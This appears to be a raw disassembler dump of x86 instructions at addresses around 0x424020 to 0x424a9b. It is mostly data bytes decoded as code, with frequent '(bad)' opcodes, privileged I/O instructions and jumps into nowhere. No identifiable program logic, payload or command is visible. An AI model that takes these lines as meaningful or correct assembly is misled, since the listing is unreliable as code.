  424020:	mov    ebx,0xa017fce9
  424025:	(bad)  
  424027:	pop    ds
  424028:	push   esi
  424029:	inc    ecx
  42402a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42402b:	lods   eax,DWORD PTR ds:[esi]
  42402c:	xor    DWORD PTR [ebx+0x21],ebx
  42402f:	pusha  
  424030:	cmp    BYTE PTR [ecx+0x3a],ah
  424033:	loop   0x42409e
  424035:	sub    ah,BYTE PTR ds:0xbcfe40ca
  42403b:	pop    ss
  42403c:	ss enter 0x93aa,0xbc
  424041:	add    al,0x27
  424043:	(bad)  
  424044:	cmp    DWORD PTR [ebx-0x43],edx
  424047:	test   DWORD PTR [ebx+0x7c],ebp
  42404a:	repnz (bad) 
  42404c:	mov    esp,0xa009b815
  424051:	add    ebp,DWORD PTR [esi]
  424053:	test   al,0x9e
  424055:	mov    esi,0xf7cae38b
  42405a:	adc    esi,DWORD PTR [esi]
  42405c:	sbb    DWORD PTR [eax-0x42457136],ebp
  424062:	les    ebp,FWORD PTR [edx-0x7bfe7ba7]
  424068:	cmc    
  424069:	jns    0x423fff
  42406b:	repnz lock data16 mov bl,0x9b
  424070:	fidivr DWORD PTR ds:[eax+edi*8-0x45434e7d]
  424078:	add    esi,0xffffffc3
  42407b:	jl     0x4240f8
  42407d:	push   es
  42407e:	sbb    dh,BYTE PTR [edi-0x7f]
  424081:	jle    0x4240a4
  424083:	loope  0x424027
  424085:	mov    ch,0x45
  424087:	jb     0x424065
  424089:	xchg   ebp,eax
  42408a:	push   esi
  42408b:	cwde   
  42408c:	and    edx,0x2d
  42408f:	mov    ds:0xa760d03,al
  424094:	jnp    0x42405b
  424096:	xchg   ebp,eax
  424097:	in     al,dx
  424098:	add    DWORD PTR [esi],ebx
  42409a:	jle    0x424030
  42409c:	or     eax,0x1b27016d
  4240a1:	jbe    0x424120
  4240a3:	cmc    
  4240a4:	adc    bh,0x85
  4240a7:	mov    al,0x48
  4240a9:	loop   0x42404e
  4240ab:	or     DWORD PTR [edx+0x50],esi
  4240ae:	loopne 0x4240bf
  4240b0:	out    dx,al
  4240b1:	cdq    
  4240b2:	push   ss
  4240b3:	test   eax,ebp
  4240b5:	fucomp st(0)
  4240b7:	retf   0x9890
  4240ba:	into   
  4240bb:	sbb    dl,BYTE PTR ds:0x65182549
  4240c1:	xchg   dl,dh
  4240c3:	lock jbe 0x42408f
  4240c6:	adc    al,0x62
  4240c8:	or     eax,0xacc72aec
  4240cd:	inc    ecx
  4240ce:	fwait
  4240cf:	sti    
  4240d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4240d1:	xchg   BYTE PTR [ecx+0x42],ah
  4240d4:	lahf   
  4240d5:	inc    edi
  4240d6:	and    eax,0xf6f3bc16
  4240db:	xchg   BYTE PTR [edi],bl
  4240dd:	xchg   edi,eax
  4240de:	add    al,0xf4
  4240e0:	pop    esi
  4240e1:	ds stc 
  4240e3:	mov    ebp,0x9ed39e35
  4240e8:	adc    eax,0x932bcd38
	...
  424155:	add    BYTE PTR [eax+ebx*2+0x2e],bh
  424159:	mov    cl,0x2e
  42415b:	idiv   edi
  42415d:	(bad)  
  42415f:	jne    0x424128
  424161:	iret   
  424162:	data16 sub ch,BYTE PTR [eax+0x182bbdf]
  424169:	add    bh,bh
  42416b:	add    BYTE PTR [eax],al
  42416d:	add    BYTE PTR [edx+edx*4],bl
  424170:	cmp    cl,BYTE PTR [eax+0x53968b7e]
  424176:	dec    esp
  424177:	ja     0x4240ff
  424179:	dec    ecx
  42417a:	dec    ebx
  42417b:	dec    esp
  42417c:	mov    bl,BYTE PTR [edx-0x3d]
  42417f:	push   esp
  424180:	xchg   ebx,eax
  424181:	scas   al,BYTE PTR es:[edi]
  424182:	test   DWORD PTR [ebx],esp
  424184:	mov    ds,WORD PTR [esi+0x36]
  424187:	pushf  
  424188:	(bad)  
  424189:	dec    edi
  42418a:	xchg   esp,eax
  42418b:	ins    BYTE PTR es:[edi],dx
  42418c:	mov    bh,0x5b
  42418e:	test   DWORD PTR [ebx-0x27ba2e7],edi
  424194:	push   esi
  424195:	mov    al,0xe9
  424197:	mov    al,0x66
  424199:	sub    DWORD PTR [ebx-0x6a],ebp
  42419c:	addr16 jb 0x4241aa
  42419f:	inc    esp
  4241a0:	cs jnp 0x4241a9
  4241a3:	ret    
  4241a4:	xchg   esi,eax
  4241a5:	inc    eax
  4241a6:	ret    0x8b8b
  4241a9:	pop    es
  4241aa:	in     eax,0xfb
  4241ac:	nop
  4241ad:	push   edx
  4241ae:	sub    BYTE PTR [eax+0x79d3bcbc],bl
  4241b4:	mov    ch,0x33
  4241b6:	add    ebp,DWORD PTR [esi-0x6f]
  4241b9:	repnz inc eax
  4241bb:	fs popf 
  4241bd:	(bad)  
  4241bf:	mov    DWORD PTR [ecx+0x6587012a],ecx
  4241c5:	out    dx,al
  4241c6:	mov    esp,edx
  4241c8:	push   ebx
  4241c9:	mov    dh,0x15
  4241cb:	aaa    
  4241cc:	mov    ch,0x61
  4241ce:	xor    esi,edi
  4241d0:	sub    al,0xcd
  4241d2:	sub    eax,0xfeb637cd
  4241d7:	rcr    BYTE PTR [eax-0x7a01d7fa],1
  4241dd:	xor    BYTE PTR [ebx+ebx*4+0x20526e13],0xaf
  4241e5:	in     eax,dx
  4241e6:	inc    ebp
  4241e7:	(bad)  
  4241e8:	(bad)  
  4241e9:	test   eax,0x93ef8f67
  4241ee:	pop    esi
  4241ef:	hlt    
  4241f0:	pop    edx
  4241f1:	xchg   ecx,eax
  4241f2:	ja     0x424178
  4241f4:	jnp    0x4241ae
  4241f6:	mov    bl,0xf
  4241f8:	mov    esi,edx
  4241fa:	inc    ebp
  4241fb:	xor    eax,0xbc623f50
  424200:	mov    cl,0x5
  424202:	scas   al,BYTE PTR es:[edi]
  424203:	mov    ebx,0x84f542c8
  424208:	rol    DWORD PTR [edx+0x3046d653],cl
  42420e:	dec    ebp
  42420f:	sbb    esp,ecx
  424211:	(bad)  
  424212:	mov    al,ds:0xe886fbda
  424217:	pop    ecx
  424218:	(bad)  
  424219:	in     al,0xcd
  42421b:	stc    
  42421c:	dec    esp
  42421d:	(bad)  
  42421e:	shr    DWORD PTR [ebx+0x4d],1
  424221:	out    dx,al
  424222:	push   eax
  424223:	daa    
  424224:	push   0x8788245
  424229:	ins    BYTE PTR es:[edi],dx
  42422a:	iret   
  42422b:	jecxz  0x424208
  42422d:	or     BYTE PTR [eax-0x45],0xc
  424231:	sub    ch,BYTE PTR [edx-0x7a]
  424234:	out    dx,al
  424235:	mov    ch,0xa5
  424237:	cwde   
  424238:	sti    
  424239:	sahf   
  42423a:	jle    0x4241cf
  42423c:	cmp    eax,0x2fa23c78
  424241:	push   edi
  424242:	dec    ecx
  424243:	icebp  
  424244:	mov    cl,0xc0
  424246:	addr16 std 
  424248:	mov    edi,0xfadd76b8
  42424d:	(bad)  
  42424e:	mov    WORD PTR [edi-0x48],gs
  424251:	fld    QWORD PTR [ecx-0x60]
  424254:	(bad)  
  424255:	jne    0x4242b0
  424257:	sbb    BYTE PTR [eax],bl
  424259:	push   eax
  42425a:	(bad)  
  42425b:	xchg   ebp,eax
  42425c:	or     DWORD PTR [edx-0x78],eax
  42425f:	iret   
  424260:	jne    0x4242c6
  424262:	xchg   esi,eax
  424263:	enter  0xafb5,0xc9
  424267:	cmp    eax,0xa1ed69d4
  42426c:	pushf  
	...
  4242d5:	add    BYTE PTR [edi-0x4c275c4c],al
  4242db:	(bad)  
  4242dd:	push   DWORD PTR [ecx+0x7]
  4242e0:	sub    al,0x5c
  4242e2:	ds xor al,0x73
  4242e5:	mov    esp,0x183ba
  4242ea:	inc    DWORD PTR [eax]
  4242ec:	add    BYTE PTR [eax],al
  4242ee:	jnp    0x424321
  4242f0:	dec    ebp
  4242f1:	jmp    0xb7104ff
  4242f6:	fdivp  st(2),st
  4242f8:	push   cs
  4242f9:	sbb    DWORD PTR [esp+ebp*4-0x1b919736],eax
  424300:	sub    DWORD PTR [edi-0x11],eax
  424303:	jns    0x42433a
  424305:	cmp    BYTE PTR [edi],dl
  424307:	xchg   ecx,eax
  424308:	push   esi
  424309:	stos   DWORD PTR es:[edi],eax
  42430a:	retf   
  42430b:	xchg   esp,eax
  42430c:	dec    edi
  42430d:	push   ebp
  42430e:	jne    0x4242dc
  424310:	xchg   edi,eax
  424311:	xchg   edi,eax
  424312:	xchg   ebx,eax
  424313:	hlt    
  424314:	std    
  424315:	scas   eax,DWORD PTR es:[edi]
  424316:	ds (bad) 
  424318:	mov    ch,0xb2
  42431a:	and    ecx,eax
  42431c:	lods   eax,DWORD PTR ds:[esi]
  42431d:	inc    BYTE PTR [edx-0x75]
  424320:	(bad)  
  424321:	and    eax,0x99318b94
  424326:	cmp    al,0xb2
  424328:	ds sbb al,0x27
  42432b:	mov    esi,DWORD PTR [eax]
  42432d:	xchg   ebp,eax
  42432e:	pop    ebx
  42432f:	mov    al,0x6f
  424331:	adc    eax,DWORD PTR ds:[eax-0x6b60aa49]
  424338:	push   ebp
  424339:	adc    ecx,DWORD PTR [ecx]
  42433b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42433c:	mov    ah,0x17
  42433e:	mov    WORD PTR [ecx+0x2a66a037],cs
  424344:	aas    
  424345:	faddp  st(4),st
  424347:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  424349:	retf   0xc69d
  42434c:	ret    0xd0e8
  42434f:	sahf   
  424350:	pop    ebx
  424351:	ror    DWORD PTR [edi],1
  424353:	jnp    0x424311
  424355:	or     ecx,esp
  424357:	imul   ecx,DWORD PTR [edi],0x714d18d3
  42435d:	xchg   edi,eax
  42435e:	pop    edx
  42435f:	popa   
  424360:	inc    BYTE PTR [ebx-0x42]
  424363:	lea    edx,[ecx+eax*8]
  424366:	add    eax,0x6d4b91e3
  42436b:	mov    ds:0x63685a2,eax
  424370:	jae    0x42437d
  424372:	(bad)  
  424374:	scas   eax,DWORD PTR es:[edi]
  424375:	lods   eax,DWORD PTR ds:[esi]
  424376:	xchg   ecx,eax
  424377:	pop    ebx
  424378:	mov    eax,0x11244f2f
  42437d:	and    DWORD PTR [ebx+0x16e860d7],0x6a49c4ee
  424387:	add    eax,0x7d858d82
  42438c:	out    dx,al
  42438d:	imul   ecx,DWORD PTR [ebp-0x55],0xffffffed
  424391:	dec    esp
  424392:	push   ebp
  424393:	fsub   DWORD PTR [ebp+0x360b948e]
  424399:	mov    BYTE PTR [esi],dl
  42439b:	ins    BYTE PTR es:[edi],dx
  42439c:	push   ecx
  42439d:	xchg   edi,eax
  42439e:	xor    bl,bh
  4243a0:	mov    es,WORD PTR [ebx-0x77c0ca04]
  4243a6:	aam    0x46
  4243a8:	xchg   esi,eax
  4243a9:	ins    DWORD PTR es:[edi],dx
  4243aa:	dec    ebp
  4243ab:	jb     0x4243b4
  4243ad:	test   eax,0xf9e10838
  4243b2:	in     al,0xeb
  4243b4:	test   eax,0xb4e551d5
  4243b9:	adc    al,0x72
  4243bb:	add    al,0x2e
  4243bd:	or     DWORD PTR [ebp+esi*2+0x6bd907a7],edx
  4243c4:	sbb    eax,0xc848f8f3
  4243c9:	pop    ebx
  4243ca:	jno    0x424373
  4243cc:	xor    BYTE PTR [edx+ebx*1],bh
  4243cf:	lock and DWORD PTR [eax],edx
  4243d2:	adc    BYTE PTR [esi+0x7f],0xae
  4243d6:	addr16 sahf 
  4243d8:	das    
  4243d9:	mov    eax,0x19609dac
  4243de:	mov    bh,0xd4
  4243e0:	shl    cl,1
  4243e2:	call   0x5bff832d
  4243e7:	test   eax,0xe9e683c6
  4243ec:	and    eax,DWORD PTR [eax]
	...
  424456:	mov    ah,BYTE PTR [esi]
  424458:	jge    0x424414
  42445a:	std    
  42445b:	sti    
  42445c:	iret   
  42445d:	ss aam 0xb
  424460:	push   ss
  424461:	jno    0x4244a5
  424463:	test   al,0xad
  424465:	cld    
  424466:	mov    ecx,0xff000184
  42446b:	add    BYTE PTR [eax],al
  42446d:	add    BYTE PTR [esi+0x510c9bc2],bl
  424473:	adc    DWORD PTR [eax-0x5b8626e6],edx
  424479:	pusha  
  42447a:	aam    0x3a
  42447c:	jp     0x4244e5
  42447e:	repnz xor ch,BYTE PTR [ecx]
  424481:	(bad)  
  424482:	jg     0x4244c8
  424484:	pusha  
  424485:	lahf   
  424486:	pop    ebx
  424487:	neg    BYTE PTR [ebp-0x22]
  42448a:	fstp   TBYTE PTR [esi+0x16ba28c3]
  424490:	les    eax,FWORD PTR [ecx]
  424492:	inc    esp
  424493:	rol    DWORD PTR [eax+esi*4],1
  424496:	std    
  424497:	fsub   QWORD PTR [esi-0x79]
  42449a:	ins    BYTE PTR es:[edi],dx
  42449b:	jo     0x4244ec
  42449d:	jge    0x424467
  42449f:	fcom   QWORD PTR [ebx+0x41b9fa89]
  4244a5:	test   DWORD PTR [ebx+ebp*8+0x45e19daf],esi
  4244ac:	enter  0x8f13,0x7d
  4244b0:	push   cs
  4244b1:	faddp  st(1),st
  4244b3:	int    0xce
  4244b5:	or     bh,cl
  4244b7:	stc    
  4244b8:	xlat   BYTE PTR ds:[ebx]
  4244b9:	pop    edx
  4244ba:	mov    edx,0xa9416734
  4244bf:	out    dx,al
  4244c0:	mov    ds:0x82810354,al
  4244c5:	js     0x424482
  4244c7:	pop    ebp
  4244c8:	sbb    ah,bh
  4244ca:	jb     0x424496
  4244cc:	sub    BYTE PTR [eax+0x23],dl
  4244cf:	cmp    DWORD PTR [eax+0x15],ebx
  4244d2:	xor    ch,bh
  4244d4:	sub    al,0x4
  4244d6:	push   edx
  4244d7:	cmp    DWORD PTR [ebp+ecx*1+0x6d],edi
  4244db:	push   ebp
  4244dc:	and    ch,BYTE PTR [ebp+0xb]
  4244df:	mov    WORD PTR [ecx-0x36],es
  4244e2:	jnp    0x4244d8
  4244e4:	mov    al,0xe3
  4244e6:	lahf   
  4244e7:	stc    
  4244e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4244e9:	jns    0x4244fc
  4244eb:	loopne 0x424520
  4244ed:	dec    ecx
  4244ee:	rcl    BYTE PTR [ecx],0x5c
  4244f1:	mov    dh,0x82
  4244f3:	pop    eax
  4244f4:	xchg   esp,eax
  4244f5:	mov    ds:0xc84d5027,eax
  4244fa:	repz inc esi
  4244fc:	push   ss
  4244fd:	aam    0x59
  4244ff:	add    BYTE PTR [esi],ch
  424501:	out    0x81,eax
  424503:	(bad)  
  424504:	out    0x67,al
  424506:	mov    dl,dh
  424508:	cwde   
  424509:	ins    DWORD PTR es:[edi],dx
  42450a:	mov    edx,0x53ae126c
  42450f:	rcr    DWORD PTR [edx+0x20],0xbb
  424513:	add    al,0x1b
  424515:	dec    ebp
  424516:	leave  
  424517:	mov    ds:0x1053aa88,eax
  42451c:	leave  
  42451d:	cmp    edx,DWORD PTR [edi+0x7b360cee]
  424523:	dec    esi
  424524:	mov    esi,0xa4cc9340
  424529:	fcomp  DWORD PTR ds:0x4bf168be
  42452f:	in     al,dx
  424530:	in     eax,dx
  424531:	daa    
  424532:	xor    BYTE PTR [eax+0x57],dl
  424535:	je     0x424596
  424537:	xlat   BYTE PTR ds:[ebx]
  424538:	push   0xffffffb0
  42453a:	cmp    DWORD PTR [esi+0x1408c97e],0x65235d7e
  424544:	jo     0x424503
  424546:	jl     0x4244f4
  424548:	mov    al,0x47
  42454a:	add    al,0x24
  42454c:	push   ecx
  42454d:	das    
  42454e:	jo     0x424587
  424550:	jl     0x424594
  424552:	xor    eax,0x62481ac4
  424557:	loope  0x42457b
  424559:	fild   QWORD PTR [esi]
  42455b:	xor    ecx,DWORD PTR [eax]
  42455d:	jecxz  0x424598
  42455f:	mov    ecx,DWORD PTR [edx+0x25517edb]
  424565:	mov    al,0x3d
  424567:	mov    bh,0x59
  424569:	jo     0x42458c
  42456b:	jp     0x4245d9
	...
  4245d5:	add    al,ah
  4245d7:	outs   dx,DWORD PTR ds:[esi]
  4245d8:	xchg   esi,eax
  4245d9:	inc    edx
  4245da:	lahf   
  4245db:	sti    
  4245dc:	hlt    
  4245dd:	out    dx,eax
  4245de:	dec    eax
  4245df:	rol    DWORD PTR [esp+ebx*4-0xe],1
  4245e3:	fwait
  4245e4:	mov    bl,0x3e
  4245e6:	mov    eax,0xff000185
  4245eb:	add    BYTE PTR [eax],al
  4245ed:	add    dh,ch
  4245ef:	mov    esi,0xa20d28
  4245f4:	and    dl,BYTE PTR [edx]
  4245f6:	and    DWORD PTR [ecx+0x3fe14af],0xe659694c
  424600:	push   cs
  424601:	lock push esp
  424603:	test   al,0x9e
  424605:	adc    esi,DWORD PTR [ebx+0x37]
  424608:	test   BYTE PTR [edx+ecx*1-0x41],ah
  42460c:	test   al,0xdc
  42460e:	call   0xf5a044d5
  424613:	inc    esp
  424614:	aaa    
  424615:	(bad)
  424618:	ins    BYTE PTR es:[edi],dx
  424619:	test   DWORD PTR [ebx-0x6b5b0136],ebx
  42461f:	mov    eax,0xca8ec5bf
  424624:	aad    0xad
  424626:	xlat   BYTE PTR ds:[ebx]
  424627:	rol    DWORD PTR [esi],cl
  424629:	imul   ebx,DWORD PTR [edx-0x3b56c657],0xef8128c0
  424633:	lods   al,BYTE PTR ds:[esi]
  424634:	pop    edx
  424635:	shl    BYTE PTR [esi+ecx*2-0x7a],cl
  424639:	xchg   ecx,eax
  42463a:	or     cl,BYTE PTR [esp+eax*2-0xe]
  42463e:	mov    ebp,0xda2f2456
  424643:	pop    esi
  424644:	sbb    ah,cl
  424646:	cmp    bh,BYTE PTR [ecx-0x41]
  424649:	push   0xffffffd6
  42464b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42464c:	xor    DWORD PTR [ecx+0x2189f3b7],esi
  424652:	and    eax,0xe7aa2c80
  424657:	dec    ecx
  424658:	jmp    0xbb4121d6
  42465d:	sub    al,BYTE PTR [ebx-0x28]
  424660:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424661:	inc    eax
  424662:	push   ebp
  424663:	in     eax,0xa2
  424665:	aaa    
  424666:	mov    ds:0x40d00cb2,al
  42466b:	ins    BYTE PTR es:[edi],dx
  42466c:	inc    eax
  42466d:	retf   0x78c1
  424670:	sahf   
  424671:	not    DWORD PTR [ecx-0x3e]
  424674:	push   ss
  424675:	icebp  
  424676:	mov    BYTE PTR [edx-0x239b7f28],0x10
  42467d:	inc    edi
  42467e:	fimul  DWORD PTR [ecx-0x6b]
  424681:	xchg   esi,eax
  424682:	enter  0x1ebd,0x12
  424686:	ins    DWORD PTR es:[edi],dx
  424687:	popa   
  424688:	cmp    al,BYTE PTR [ecx+0x1b]
  42468b:	bound  ecx,QWORD PTR [ebx-0x6d4239ec]
  424691:	aas    
  424692:	jnp    0x424645
  424694:	push   edx
  424695:	jnp    0x4246df
  424697:	pop    ds
  424698:	lahf   
  424699:	mov    al,ds:0xca38f583
  42469e:	cmc    
  42469f:	sar    BYTE PTR [ecx],0x71
  4246a2:	jmp    0x42463e
  4246a4:	lahf   
  4246a5:	push   cs
  4246a6:	jns    0x4246a6
  4246a8:	sub    BYTE PTR [edi],bl
  4246aa:	les    ebp,FWORD PTR [edx-0x5f]
  4246ad:	in     al,dx
  4246ae:	sar    BYTE PTR [edi+ebx*2],1
  4246b1:	jp     0x4246f6
  4246b3:	push   ds
  4246b4:	out    dx,al
  4246b5:	xchg   esp,eax
  4246b6:	addr16 pusha 
  4246b8:	outs   dx,BYTE PTR ds:[esi]
  4246b9:	dec    esp
  4246ba:	mov    esi,0x130bddd9
  4246bf:	popf   
  4246c0:	mov    edx,0xd2b94a32
  4246c5:	loope  0x4246d9
  4246c7:	test   DWORD PTR [ebx+0x29b39232],eax
  4246cd:	xor    DWORD PTR [edx+0x5b21d504],0x658d782a
  4246d7:	scas   al,BYTE PTR es:[edi]
  4246d8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4246d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4246da:	pop    ecx
  4246db:	cmp    cl,BYTE PTR [edi+0x5d]
  4246de:	pop    ebp
  4246df:	leave  
  4246e0:	ins    BYTE PTR es:[edi],dx
  4246e1:	pop    esp
  4246e2:	rcl    BYTE PTR es:[edi],1
  4246e5:	cmp    eax,0x740b32b7
  4246ea:	mov    al,ds:0x6ce6
	...
  424753:	add    BYTE PTR [eax],al
  424755:	add    BYTE PTR [edx+edx*4-0x10004],bh
  42475c:	mov    edi,0xb298dbd3
  424761:	mov    BYTE PTR [edx-0x48044210],bl
  424767:	xchg   BYTE PTR [ecx],al
  424769:	add    bh,bh
  42476b:	add    BYTE PTR [eax],al
  42476d:	add    dh,cl
  42476f:	inc    ecx
  424770:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424771:	and    DWORD PTR [ebp+0x5],esp
  424774:	pop    eax
  424775:	rcl    ch,1
  424777:	mov    eax,0xa16a6e51
  42477c:	and    BYTE PTR [eax+ebp*8],ah
  42477f:	int    0x2b
  424781:	data16 jl 0x4247a3
  424784:	stos   DWORD PTR es:[edi],eax
  424785:	aas    
  424786:	xchg   ebx,eax
  424787:	mov    esi,DWORD PTR [edx+0x172b5a19]
  42478d:	daa    
  42478e:	jb     0x424734
  424790:	test   BYTE PTR [ebx],0x4b
  424793:	cs jae 0x424760
  424796:	adc    eax,0xe73de85b
  42479b:	sub    BYTE PTR [esi],ah
  42479d:	push   ebp
  42479e:	retf   0xf5e7
  4247a1:	mov    al,0x6f
  4247a3:	mov    ch,0x57
  4247a5:	sbb    bl,BYTE PTR [ebp-0x6e]
  4247a8:	pop    edi
  4247a9:	mov    ebx,0x6c1fb240
  4247ae:	sbb    BYTE PTR [eax-0x390caba6],dl
  4247b4:	or     dh,bl
  4247b6:	xlat   BYTE PTR ds:[ebx]
  4247b7:	push   edi
  4247b8:	ds aaa 
  4247ba:	sbb    DWORD PTR [eax-0x43],ecx
  4247bd:	fstp   QWORD PTR [eax-0x1174ff63]
  4247c3:	mov    ds:0x2d1cd82d,eax
  4247c8:	pop    DWORD PTR [ebx]
  4247ca:	fwait
  4247cb:	xchg   esi,eax
  4247cc:	sub    ebx,ecx
  4247ce:	push   es
  4247cf:	fwait
  4247d0:	nop
  4247d1:	lods   eax,DWORD PTR ds:[esi]
  4247d2:	ret    0x96ea
  4247d5:	jo     0x42479a
  4247d7:	mov    esi,0x7c19e76d
  4247dc:	xor    al,bl
  4247de:	and    dh,bl
  4247e0:	inc    eax
  4247e1:	outs   dx,BYTE PTR ds:[esi]
  4247e2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4247e3:	frstor [esi]
  4247e5:	or     ah,ah
  4247e7:	adc    al,0xdf
  4247e9:	clc    
  4247ea:	push   esi
  4247eb:	mov    WORD PTR [ebp+0x6],cs
  4247ee:	or     eax,0x70b832a6
  4247f3:	scas   eax,DWORD PTR es:[edi]
  4247f4:	jecxz  0x4247d2
  4247f6:	adc    DWORD PTR [ecx+0xe2e50eb],esp
  4247fc:	call   0x2711:0xb17e1af4
  424803:	aaa    
  424804:	push   0x64
  424806:	jle    0x424836
  424808:	sub    dl,ch
  42480a:	sbb    eax,0xafbee486
  42480f:	stos   DWORD PTR es:[edi],eax
  424810:	adc    eax,0x14a7bf4f
  424815:	in     al,dx
  424816:	pop    esp
  424817:	leave  
  424818:	push   edx
  424819:	cld    
  42481a:	test   DWORD PTR [edi],esp
  42481c:	adc    ah,BYTE PTR [esi+0x20]
  42481f:	mov    eax,ds:0xcc314729
  424824:	add    al,cl
  424826:	mov    ebx,0xb819f775
  42482b:	cmp    edi,DWORD PTR [ebx-0x12]
  42482e:	xor    edx,ebx
  424830:	in     eax,0x76
  424832:	dec    edx
  424833:	retf   0xcba
  424836:	in     eax,dx
  424837:	rcr    BYTE PTR [ebx-0x3bdd42d],1
  42483d:	or     DWORD PTR [esi-0x511b026a],edi
  424843:	fistp  QWORD PTR [ecx]
  424845:	not    BYTE PTR [ecx+0x8]
  424848:	cmp    cl,BYTE PTR [ecx+0x6bdbdeb7]
  42484e:	call   0x8739e07
  424853:	jns    0x424830
  424855:	popa   
  424856:	sub    al,0xd6
  424858:	or     BYTE PTR [ebp+0x786dbfa8],bl
  42485e:	xchg   edx,eax
  42485f:	pusha  
  424860:	cmp    DWORD PTR [ecx+0x1b241ba0],esp
  424866:	push   ebp
  424867:	pusha  
  424868:	sub    DWORD PTR [edi+0x3d81d2],edi
	...
  4248d6:	and    bl,BYTE PTR [eax-0x7c]
  4248d9:	out    dx,eax
  4248da:	(bad)  
  4248db:	jmp    FWORD PTR [ebx-0x23]
  4248de:	lock test BYTE PTR [ebx],dl
  4248e1:	xchg   esp,eax
  4248e2:	dec    ebp
  4248e3:	and    eax,0x87b646f8
  4248e8:	add    DWORD PTR [eax],eax
  4248ea:	inc    DWORD PTR [eax]
  4248ec:	add    BYTE PTR [eax],al
  4248ee:	ins    DWORD PTR es:[edi],dx
  4248ef:	and    esp,DWORD PTR [ebx]
  4248f1:	popa   
  4248f2:	not    edx
  4248f4:	pop    ebp
  4248f5:	xor    al,0x87
  4248f7:	rcr    eax,0xfe
  4248fa:	mov    WORD PTR [ebx],?
  4248fc:	inc    DWORD PTR [edi+0x1e9718e2]
  424902:	fmul   DWORD PTR [eax+ecx*4]
  424905:	lods   eax,DWORD PTR ds:[esi]
  424906:	test   al,0xce
  424908:	mov    ds:0x942a04bc,al
  42490d:	js     0x424947
  42490f:	std    
  424910:	cmp    DWORD PTR [edi-0x41090076],edi
  424916:	rcl    BYTE PTR [esi+0x3f211719],0xb8
  42491d:	sub    eax,0x1a6983d1
  424922:	(bad)  
  424923:	sbb    esp,DWORD PTR [esi-0xc]
  424926:	scas   eax,DWORD PTR es:[edi]
  424927:	pushw  ds
  424929:	into   
  42492a:	push   ebp
  42492b:	daa    
  42492c:	adc    cl,BYTE PTR [esi-0x1df7dd74]
  424932:	pop    ss
  424933:	clc    
  424934:	mov    edx,0x25925c26
  424939:	sbb    ecx,DWORD PTR [eax-0x49]
  42493c:	and    cl,BYTE PTR [esi-0x7c649cec]
  424942:	aas    
  424943:	mov    cs,esp
  424945:	(bad)  
  424946:	cli    
  424947:	daa    
  424948:	je     0x424983
  42494a:	xor    eax,0xc4156b5e
  42494f:	fldcw  WORD PTR [esi]
  424951:	dec    ebx
  424952:	test   eax,0x29ab517
  424957:	jmp    0x4249cd
  424959:	loop   0x4249d6
  42495b:	push   eax
  42495c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42495d:	popa   
  42495e:	dec    esi
  42495f:	jle    0x42494b
  424961:	fidivr DWORD PTR [ecx-0x7577e982]
  424967:	loop   0x4249db
  424969:	rol    bh,0x29
  42496c:	jne    0x4249c6
  42496e:	(bad)  
  42496f:	push   ebp
  424970:	xor    BYTE PTR [eax],cl
  424972:	mov    ds:0xff7741b3,eax
  424977:	adc    eax,0xf74ba7db
  42497c:	popf   
  42497d:	push   edi
  42497e:	arpl   WORD PTR ds:0xd305387f,bp
  424984:	out    dx,eax
  424985:	jns    0x424994
  424987:	mov    ?,WORD PTR [edx-0x7]
  42498a:	rol    BYTE PTR [esi-0x27],0xeb
  42498e:	push   ds
  42498f:	leave  
  424990:	sar    BYTE PTR [esi],cl
  424992:	dec    eax
  424993:	and    BYTE PTR [esp+eiz*4+0x6b92782c],bh
  42499a:	sbb    dh,ah
  42499c:	push   ecx
  42499d:	leave  
  42499e:	and    DWORD PTR [eax-0x3f3fc3a8],edi
  4249a4:	cmp    DWORD PTR [ecx],esp
  4249a6:	xor    eax,0x2df30301
  4249ab:	jle    0x424939
  4249ad:	adc    edx,ecx
  4249af:	or     DWORD PTR [edi+esi*4-0xea18ef0],0x4237ba34
  4249ba:	adc    al,0xb2
  4249bc:	dec    ebx
  4249bd:	add    BYTE PTR [edx],0x62
  4249c0:	mov    dh,BYTE PTR [esi+0x3aa8f2a6]
  4249c6:	test   eax,0x2a9b5cfa
  4249cb:	leave  
  4249cc:	(bad)  
  4249cd:	nop
  4249ce:	loop   0x424973
  4249d0:	pop    ebp
  4249d1:	test   eax,0x5c3fe184
  4249d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4249d7:	gs in  al,dx
  4249d9:	iret   
  4249da:	in     eax,0x66
  4249dc:	mov    dl,0xf7
  4249de:	(bad)
  4249e1:	mov    ds:0x911e9a41,eax
  4249e6:	jbe    0x4249bf
  4249e8:	(bad)  
  4249e9:	jge    0x4249a4
  4249eb:	lods   eax,DWORD PTR ds:[esi]
  4249ec:	lds    eax,FWORD PTR [eax]
	...
  424a56:	imul   ebx,DWORD PTR [eax],0x63
  424a59:	push   0x73
  424a5b:	jnp    0x424ac8
  424a5d:	sbb    DWORD PTR [eax-0x5c],ecx
  424a60:	push   esi
  424a61:	xor    ch,ch
  424a63:	out    dx,eax
  424a64:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424a65:	sub    esi,DWORD PTR [ebp-0xfffe78]
  424a6b:	add    BYTE PTR [eax],al
  424a6d:	add    al,ah
  424a6f:	mov    ecx,esi
  424a71:	adc    al,0xc1
  424a73:	and    eax,0x849d9bd9
  424a78:	aad    0x8f
  424a7a:	xor    al,0xed
  424a7c:	jno    0x424a1d
  424a7e:	lahf   
  424a7f:	repz mov dl,0x6c
  424a82:	jecxz  0x424acf
  424a84:	mov    DWORD PTR [esi+eiz*4],esi
  424a87:	lods   al,BYTE PTR ds:[esi]
  424a88:	mov    edx,0xfb5130a2
  424a8d:	and    bl,al
  424a8f:	fldenv [eax+0x6f]
  424a92:	mov    ch,BYTE PTR [ebp-0x4623d11d]
  424a98:	rcl    ch,1
  424a9a:	stos   BYTE PTR es:[edi],al
  424a9b:	cli    
